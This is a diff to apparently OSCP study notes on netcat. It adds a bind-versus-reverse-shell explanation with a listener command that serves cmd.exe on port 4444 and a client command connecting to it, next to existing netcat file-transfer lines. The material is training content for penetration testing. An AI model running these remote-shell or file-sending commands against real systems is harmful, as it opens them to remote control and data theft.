@@ -26,7 +26,18 @@ nc -nlvp <[PORT]> > <[FILE]>
 
 nc -nv <[IP]> <[PORT]> < <[FILE_TO_SEND]>
 
-![ScreenShot](https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Bind_Reverse_shell.png =100x20)
+# Bind vs Reverse Shell
+
+<img src="https://raw.github.com/SynAckPwn23/Go-For-OSCP/master/Bind_Reverse_shell.png" width="500"/>
+
+<b>Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:<b>
+
+(BOB): nc -nlvp 4444 -e cmd.exe
+
+<b>Alice connects to Bob's pc:<b>
+
+(ALICE): nc -nv 10.11.17.9 4444
+
 
 
 
